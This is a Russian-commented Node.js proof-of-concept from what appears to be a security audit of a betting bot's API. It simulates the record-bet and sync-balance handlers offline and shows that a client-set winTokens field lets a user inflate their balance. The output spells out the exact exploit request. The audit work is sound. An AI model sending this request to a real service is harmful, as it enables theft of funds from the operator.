#!/usr/bin/env node
/**
 * PoC: клиент управляет результатом игры — по коду ПОСЛЕ патча b8b56f5.
 *
 * Симулирует /api/record-bet (bot.js:1301–1355) и /api/sync-balance (bot.js:1359, теперь READ-ONLY).
 * Сеть и прод не затрагиваются. Дополняет poc-db-double-write.js (там — слой БД).
 *
 * Запуск:  node .agents/skills/security-audit/scripts/poc-balance-bypass.js
 */

'use strict';

const START = 3000;          // 300 ₽ на счету (10 ⬦ = 1 ₽) — депозит уже был
const RUB_DEPOSIT = 300;

// ─── Симуляция сервера «как есть» (b8b56f5) ──────────────────────────────────

const newUser = () => ({ id: 777, tokens: START, totalDepositedRub: RUB_DEPOSIT });

/** /api/record-bet — bot.js:1301–1355 */
function recordBet(u, body, isAdmin = false) {
  const userDep = u.totalDepositedRub || u.lastDeposit || 0;              // 1303
  let betTk = Math.max(0, Math.floor(Number(body.betTokens) || 0));       // 1304
  let winTk = Math.max(0, Math.floor(Number(body.winTokens) || 0));       // 1305  ← из клиента

  const maxAllowedBet = Math.max(500, Math.floor(u.tokens || 0) + 200);   // 1309
  if (betTk > maxAllowedBet && !isAdmin) {                               // 1310
    betTk = Math.min(betTk, Math.floor(u.tokens || 0));
    winTk = 0;
  }

  const NON_DEPOSITOR_CAP = 400;                                          // 1322
  let nextTk = Math.max(0, Math.floor((u.tokens || 0) - betTk + winTk));  // 1323
  if (userDep <= 0 && !isAdmin && nextTk > NON_DEPOSITOR_CAP) nextTk = 350; // 1325

  u.tokens = nextTk;                                                      // 1335
  return u.tokens;
}

/** /api/sync-balance — bot.js:1359–1361  (теперь строго READ-ONLY) */
function syncBalance(u, body) {
  return u.tokens;   // body.tokens больше не читается вообще
}

// ─── Кейсы ───────────────────────────────────────────────────────────────────

const cases = [
  {
    id: 'A', expectSafe: START,
    title: 'record-bet: клиентский winTokens (депозит есть — потолок не спасает)',
    run: () => recordBet(newUser(), { betTokens: 0, winTokens: 999_999, game: 'dice' })
  },
  {
    id: 'B', expectSafe: START,
    title: 'sync-balance: попытка установить баланс',
    run: () => syncBalance(newUser(), { tokens: 10_000_000, game: 'dice' })
  },
  {
    id: 'C', expectSafe: START,
    title: 'record-bet: клиентский winTokens БЕЗ депозита (потолок 400 ⬦)',
    run: () => {
      const u = { id: 778, tokens: 50, totalDepositedRub: 0 };
      return recordBet(u, { betTokens: 0, winTokens: 999_999, game: 'dice' });
    }
  },
  {
    id: 'D', expectSafe: START,
    title: 'record-bet: ставка выше баланса (контрольный — защита работает)',
    run: () => recordBet(newUser(), { betTokens: 999_999, winTokens: 999_999, game: 'dice' })
  },
  {
    id: 'E', expectSafe: START,
    title: 'record-bet: поле tokens (старый вектор — больше не читается)',
    run: () => recordBet(newUser(), { betTokens: 0, winTokens: 0, tokens: 9_000_000, game: 'cases' })
  }
];

// ─── Прогон ──────────────────────────────────────────────────────────────────

const C = { red: s => `\x1b[31m${s}\x1b[0m`, grn: s => `\x1b[32m${s}\x1b[0m`, dim: s => `\x1b[2m${s}\x1b[0m` };

console.log('\nPoC: клиент управляет результатом игры — MoneyForUp @ b8b56f5');
console.log(C.dim(`исходный баланс ${START} ⬦ (${START / 10} ₽), депозит ${RUB_DEPOSIT} ₽\n`));
console.log(C.dim('Слой БД (удвоение через saveUser + atomicBalanceChange) — в poc-db-double-write.js\n'));

let exploited = 0;
for (const c of cases) {
  const got = c.run();
  const pwned = got > c.expectSafe;
  if (pwned) exploited++;
  console.log(`[${c.id}] ${c.title}`);
  console.log(`     ${START} ⬦ → ${got} ⬦ (${(got / 10).toFixed(0)} ₽)   ${pwned ? C.red('❌ ЭКСПЛОЙТ') : C.grn('✅ защищено')}`);
  if (pwned) console.log(C.red(`     вывод ≥200 ₽: ${got >= 2000 ? 'ПРОХОДИТ' : 'нет'}   ущерб до ${((got - START) / 10).toFixed(0)} ₽`));
  console.log('');
}

console.log('─'.repeat(64));
if (exploited > 0) {
  console.log(C.red(`ИТОГ: ${exploited} эксплуатируемых кейс(а).`));
  console.log('Главный вектор: POST /api/record-bet { betTokens: 0, winTokens: 999999, game: "dice" }');
  console.log('Слой БД удваивает результат — см. poc-db-double-write.js\n');
  process.exit(1);
} else {
  console.log(C.grn('ИТОГ: все кейсы защищены.'));
  console.log('Проверь вручную: честная игра, депозит и вывод всё ещё работают.\n');
  process.exit(0);
}
